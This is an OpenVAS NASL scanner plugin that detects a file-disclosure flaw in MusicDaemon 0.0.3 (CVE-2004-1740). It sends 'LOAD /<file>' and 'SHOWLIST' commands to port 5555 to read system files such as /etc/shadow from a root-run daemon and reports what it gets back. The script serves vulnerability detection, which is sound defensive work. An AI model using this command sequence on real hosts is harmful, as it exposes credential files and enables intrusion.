# OpenVAS Vulnerability Test
# $Id: musicd_file_disclosure.nasl 13543 2019-02-08 14:43:51Z cfischer $
# Description: Music Daemon File Disclosure
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# From: "cyber talon" <cyber_talon@hotmail.com>
# Subject: MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer / DoS
# Date: 23.8.2004 17:36

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14354");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1740");
  script_bugtraq_id(11006);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Music Daemon File Disclosure");


  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");

  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Remote file access");

  script_dependencies("find_service2.nasl", "os_detection.nasl");
  script_require_ports("Services/musicdaemon", 5555);
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The remote host is running MusicDaemon, a music player running as a server.

  It is possible to cause the Music Daemon to disclose the
  content of arbitrary files by inserting them to the list
  of tracks to listen to.

  An attacker can list the content of arbitrary files including the
  /etc/shadow file, as by default the daemon runs under root privileges.");
  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

port = get_kb_item("Services/musicdaemon");
if ( ! port ) port = 5555;
if ( port == 0 ) exit(0);

if ( ! get_port_state(port) ) exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);

files = traversal_files();

recv = recv_line(socket:soc, length: 1024);

if ("Hello" >< recv)
{
  foreach pattern(keys(files)) {

    file = files[pattern];

    data = string("LOAD /" + file + "\r\n");
    send(socket:soc, data: data);

    data = string("SHOWLIST\r\n");
    send(socket:soc, data: data);

    recv = recv(socket:soc, length: 1024);
    close(soc);
    if (egrep(pattern:pattern, string:recv)) {
      report = 'It was possible to read the file "/' + file + '" and extract the following content:\n' + recv;
      security_message(data:report, port:port);
      exit(0);
    }
  }
}

exit(99);